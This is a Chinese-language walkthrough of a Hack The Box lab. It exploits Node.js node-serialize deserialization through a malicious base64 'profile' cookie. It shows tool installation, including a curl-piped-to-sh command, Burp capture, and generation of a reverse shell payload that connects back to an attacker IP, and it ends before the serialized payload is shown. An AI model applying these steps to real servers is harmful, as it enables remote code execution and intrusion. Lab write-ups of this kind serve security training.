## 演示环境

目标机- Hackthebox节点机(10.10.10.85:3000)

攻击者机器- Kali linux

需要的工具- nodejs, npm, \[nodejs工具包\]，node-serialize

## 关于反序列化攻击

不受信任的数据被传递到`unserialize()`函数，这导致我们可以绕过`JavaScript`对象的函数表达式`IIFE`来实现任意的代码执行。首先我们在`apt-get`命令下安装nodejs包，如下所示：`apt-get install nodejs`   
![](../Images/b48762ee5f441164d64e233eb50b0085.png)在下一步中，您需要在CURL命令下安装`npm`程序（使用npm 进一步安装`node-serialize`包），如下所示：`curl -Lhttps://www.npmjs.com/install.sh | sh`   
![](../Images/28fffd15546929b9a1cbd3f689033cf8.png)安装和配置完Nodejs和Npm之后，还要安装`node-serialize`包，输入`“ npm install node-serialize ”`，如下所示：   
![](../Images/ab8d31aa734710bade33ad570ad5e719.png)我们已经与HacktheBox服务器连接，其服务器的IP为10.10.10.85:3000（运行Nodejs Express Framework，您可以使用Nmap Scanning进一步确认） 。   
![](../Images/7ef4141d0e5d3a25c646ca2bc2370a40.png)第一步，我们使用Burp Suite捕获上述Nodejs的GET请求，如下所示：   
![](../Images/43a82877635c152043f2045d32949fde.png)第二步中，选择cookie值并将其发送到Decoder选项进行进一步解密。![](../Images/e85bc8976b2408f7277b07f79ef0eed8.png)这个漏洞在于，它从HTTP请求中读取一个名为`profile`的`cookie`值，并对cookie值进行base64解码，并将其传递给`unserialize()`函数。所以攻击者可以构建恶意cookie值来利用这个漏洞。   
![](../Images/b70763a6ae7d25ca5148030917e61747.png)第三步，您需要下载Ajin Abraham开发的Nodejs Security Toolkit工具，要安装Nodejs Security Toolkit，请在终端中键入以下命令。`git clone https://github.com/ajinabraham/Node.Js-Security-Course.git`![](../Images/cc963acaa373acc0ac83d6a8e930ed0e.png)要创建一个反向shell，首先，您需要输入```“ ifconfig ”`` 找出IP ，然后运行以下命令：```python nodejsshell.py 10.10.14.145 4443`![](../Images/81f817fc95609d2715ca18993270ffcb.png)这是最后反向shell payload的输出。![](../Images/1cfbca54404202a915e3f7e0be9ee471.png)现在让我们使用以下javascript生成序列化的payload
